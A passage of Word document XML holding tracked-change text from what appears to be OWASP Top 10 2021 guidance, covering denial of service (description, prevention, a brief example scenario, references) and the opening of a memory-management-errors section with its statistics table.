          <w:ins w:id="3760" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40876914" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3761" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3762" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **Description**. Denial of service is always possible given</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25D6E8AD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3763" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3764" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    sufficient resources. However, design and coding practices have a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="40A90878" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3765" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3766" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    significant bearing on the magnitude of the denial of service.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2FB6B258" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3767" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3768" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Suppose anyone with the link can access a large file, or a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0EE4B024" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3769" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3770" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    computationally expensive transaction occurs on every page. In that</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76460434" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3771" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3772" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    case, denial of service requires less effort to conduct.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="771C48C1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3773" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13201CB6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3774" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3775" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **How to prevent**. Performance test code for CPU, I/O, and memory</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="51FA2AB0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3776" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3777" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    usage, re-architect, optimize, or cache expensive operations.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0544811A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3778" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3779" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">    Consider access controls for larger objects to ensure that only</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="301969C9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3780" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3781" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    authorized individuals can access huge files or objects or serve</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="59FC055B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3782" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3783" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    them by an edge caching network. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="34665CE2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3784" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5606285C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3785" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3786" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **Example attack scenarios**. An attacker might determine that an</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="45473E98" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3787" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3788" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    operation takes 5-10 seconds to complete. When running four</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="593919A5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3789" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3790" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    concurrent threads, the server seems to stop responding. The</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E99B344" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3791" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3792" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    attacker uses 1000 threads and takes the entire system offline.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="697F4038" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3793" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51CFA2BF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3794" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3795" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **References**</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25A363A3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3796" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3797" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-  [</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP Cheat Sheet: Denial of Service](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08322D6C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3798" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08054D79" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3799" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3800" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [OWASP Attacks: Denial of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Service](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owasp.org/www-community/attacks/Denial_of_Service) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4E79C823" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3801" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30FFD4DC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3802" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3803" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Memory Management Errors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6195D635" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3804" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C47AABC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3805" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3806" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">| CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mapped  |</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Max Incidence Rate  | Avg Incidence Rate  | Avg Weighted Exploit  | Avg Weighted Impact  | Max Coverage  | Avg Coverage  | Total Occurrences  | Total CVEs  |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="746DD552" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3807" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3808" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="349DA1A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3809" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3810" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 14           | 7.03%               | 1.16%               | 6.7                   | 8.1                  | 56.06%        | 31.74%        | 26576              | 16184       |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E4E5443" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3811" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E035FB6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3812" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3813" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **Description**. Web applications tend to be written in managed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="227BAD00" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3814" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3815" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    memory languages, such as Java, .NET, or node.js (JavaScript or</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7DA89158" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3816" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3817" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    TypeScript). However, these languages are written in systems</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46DCCD96" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3818" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3819" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    languages that have memory management issues, such as buffer or heap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FC7CDA2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3820" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3821" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    overflows, use after free, integer overflows, and more. There have</w:t>
        </w:r>
      </w:ins>
    </w:p>
